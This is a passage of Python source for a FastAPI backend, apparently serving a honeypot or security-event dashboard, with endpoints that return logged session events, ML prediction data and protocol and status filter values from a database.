            ml_row = conn.execute("SELECT * FROM ml_predictions WHERE session_id = ?", (item["session_id"],)).fetchone()
            if ml_row:
                item["ml_info"] = dict(ml_row)
                try:
                    item["ml_info"]["features"] = json.loads(item["ml_info"]["features_json"])
                except Exception:
                    pass
    return item

@app.get("/api/sessions/{session_id}")
def session_detail(session_id: str):
    with db_connect() as conn:
        rows = conn.execute(
            "SELECT id, timestamp, source_ip, source_port, protocol, session_id, event_status, message, command, command_output, username, service_description, raw_json FROM events WHERE session_id = ? ORDER BY id ASC",
            (session_id,)
        ).fetchall()
        ml_row = conn.execute("SELECT * FROM ml_predictions WHERE session_id = ?", (session_id,)).fetchone()

    items = []
    for r in rows:
        it = dict(r)
        try:
            it["raw_json"] = json.loads(it["raw_json"])
        except Exception:
            pass
        items.append(it)

    ml_info = None
    if ml_row:
        ml_info = dict(ml_row)
        try:
            ml_info["features"] = json.loads(ml_info["features_json"])
            ml_info["commands"] = json.loads(ml_info["commands_json"])
        except Exception:
            pass

    return {
        "session_id": session_id,
        "total": len(items),
        "events": items,
        "ml_prediction": ml_info
    }

@app.get("/api/filters")
def filters():
    with db_connect() as conn:
        protocols = [r[0] for r in conn.execute("SELECT DISTINCT protocol FROM events WHERE protocol IS NOT NULL ORDER BY protocol")]
        statuses = [r[0] for r in conn.execute("SELECT DISTINCT event_status FROM events WHERE event_status IS NOT NULL ORDER BY event_status")]
    return {"protocols": protocols, "statuses": statuses}
